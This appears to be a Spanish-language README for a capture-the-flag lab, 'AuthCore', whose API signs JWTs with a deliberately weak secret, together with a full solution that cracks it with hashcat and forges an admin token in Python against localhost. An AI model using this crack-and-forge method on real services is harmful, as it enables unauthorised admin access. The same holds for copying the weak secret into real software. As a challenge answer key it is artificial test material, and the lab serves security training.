# AuthCore

| Campo       | Valor                        |
|-------------|------------------------------|
| Categoria   | API                          |
| Dificultad  | Medium                       |
| Docker      | Si                           |
| Puerto      | 80                           |

## Descripcion

Una API REST usa JWT (HS256) para autenticacion. Los tokens incluyen un campo `role` en el payload. Los usuarios normales obtienen `role: user`. El endpoint `/api/admin/flag` requiere `role: admin`. El secreto de firma es debil y crackeable.

## Vulnerabilidad

**Weak JWT Secret (OWASP API2)**

El secreto HMAC-SHA256 es `hackl4bs` — una palabra del diccionario. Con un token valido obtenido del endpoint `/api/auth/info`, se puede crackear el secreto con `hashcat` o `jwt_tool`, y luego forjar un nuevo token con `role: admin`.

## Solucion

### Opcion 1 — hashcat

```bash
# Obtener un token de ejemplo
TOKEN=$(curl -s http://localhost:8080/api/auth/info | python3 -c \
  "import sys,json; print(json.load(sys.stdin)['token_example'])")

# Crackear con hashcat (modo 16500 = JWT HS256)
echo "$TOKEN" > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# Encuentra: hackl4bs
```

### Opcion 2 — Python manual

```python
import jwt, datetime

secret = "hackl4bs"
payload = {
    "sub": "hacker",
    "role": "admin",
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1),
}
admin_token = jwt.encode(payload, secret, algorithm="HS256")
print(admin_token)
```

```bash
# Usar el token forjado
curl -s http://localhost:8080/api/admin/flag \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

## Como ejecutar

```bash
FLAG="CTF{mi_flag_secreta}" docker compose up --build
```

Acceder en `http://localhost:8080`
